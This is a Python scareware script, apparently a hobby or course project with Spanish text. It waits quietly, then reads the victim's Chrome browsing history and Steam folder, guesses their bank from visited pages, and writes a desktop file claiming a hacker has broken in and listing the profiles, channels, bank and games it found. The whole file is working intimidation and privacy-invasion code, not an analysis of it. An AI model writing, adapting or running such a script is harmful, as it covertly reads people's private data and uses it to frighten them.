import os
import random
# librarie "re" is for regular expression
import re
import sqlite3
import time
import glob
from pathlib import Path
from shutil import copyfile

HACKER_FILE_NAME = "PARA TI.txt"
SLEEP_SECONDS = 5
ITEMS_VETOED = ["notifications", "home", "login", "logout"]
MAX_CHECKS = 5
STEAM_FILTER = ["steam controller configs", "steamworks shared", "wallpaper_engine"]


def get_user_path():
    return "{}/".format(Path.home())


def text_scare_user(subject, type_scare_word, list_subject, hacker_file):
    if len(list_subject) >= 1:
        hacker_file.write("\n{}:\n"
                          "He visto que has estado {}: {}...".format(subject, type_scare_word, ", ".join(list_subject)))
    else:
        return


def know_execution_file_path():
    main_path = [os.getcwd()]
    letter_path = []
    print(main_path)
    for data in main_path:
        for letter in data:
            if len(letter_path) == 0:
                letter_path.append(letter)
    return letter_path[0]


def delay_action():
    n_hours = random.randrange(1, 4)
    n_minutes = random.randrange(1, 61)
    print("Durmiendo {} horas\n"
          "Durmiendo {} minutos".format(n_hours, n_minutes))
    time.sleep(n_hours)
    # time.sleep(n_hours * n_minutes * 60)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema...\n")
    return hacker_file


def get_chrome_history(user_path):
    while True:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en {} segundos...".format(SLEEP_SECONDS))
            time.sleep(SLEEP_SECONDS)


def check_steam_games(hacker_file):
    games_user = []
    subject = "Steam"
    type_scare_word = "jugando ultimamente a"

    try:
        steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
        game_paths = glob.glob(steam_path)
        game_paths.sort(key=os.path.getmtime, reverse=True)
        for game_path in game_paths:
            if game_path.lower().split("\\")[-1] not in STEAM_FILTER and len(games_user) < MAX_CHECKS:
                games_user.append(game_path.split("\\")[-1])
        text_scare_user(subject, type_scare_word, games_user, hacker_file)
    except FileNotFoundError:
        print("No esta instalado Steam")


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    subject = "Twitter"
    type_scare_word = "husmeando en los perfiles de"

    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ITEMS_VETOED and len(profiles_visited) < MAX_CHECKS:
            profiles_visited.append(results[0])
    text_scare_user(subject, type_scare_word, profiles_visited, hacker_file)


def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["Banamex", "BBVA", "Santander", "HSBC", "Banorte", "Inbursa", "American Express", "Banco Famsa"]
    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    if his_bank is not None:
        hacker_file.write("\nAdemás veo que guardas el dinero en {}... Interesante...".format(his_bank))
    else:
        return


def check_yt_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    subject = "YouTube"
    type_scare_word = "husmeando en los canales de"

    for item in chrome_history:
        result = re.findall("https://www.youtube.com/c/([A-Za-z0-9]+)$", item[2])
        if result and len(profiles_visited) < MAX_CHECKS:
            profiles_visited.append(result[0])
    text_scare_user(subject, type_scare_word, profiles_visited, hacker_file)


def check_facebook_profiles_and_scare_user(hacker_file, chrome_history):
    pass


# This def function is not ready yet, error: index out of range
def bookmarks_bar(hacker_file, chrome_history):
    bookmarks_bar_user = []
    for item in chrome_history:
        result = re.findall("https://([A-Za-z0-9]+).[A-Za-z0-9]+.[A-Za-z0-9]+/$", item[2])
        if result[0] == "www":
            result = re.findall("https://[A-Za-z0-9]+.([A-Za-z0-9]+).[A-Za-z0-9]+/$", item[2])
            bookmarks_bar_user.append(result[0])
        elif result[0] != "www":
            bookmarks_bar_user.append(result[0])
    if len(bookmarks_bar_user) >= 1:
        hacker_file.write("\nBookmarks Bar:\n"
                          "Estos son algunos de tus Bookmarks ahora mismo en google: {}..."
                          .format(", ".join(bookmarks_bar_user)))
    else:
        return


def main():
    # We're waitting between 1 and 3 hours for as not arouse suspicion
    delay_action()
    # Calculate the user path of windows
    user_path = get_user_path()
    # Collect google chrome history, whenever is possible
    chrome_history = get_chrome_history(user_path)
    # Create file in desktop
    hacker_file = create_hacker_file(user_path)
    # Write fear message
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_yt_profiles_and_scare_user(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    # bookmarks_bar(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
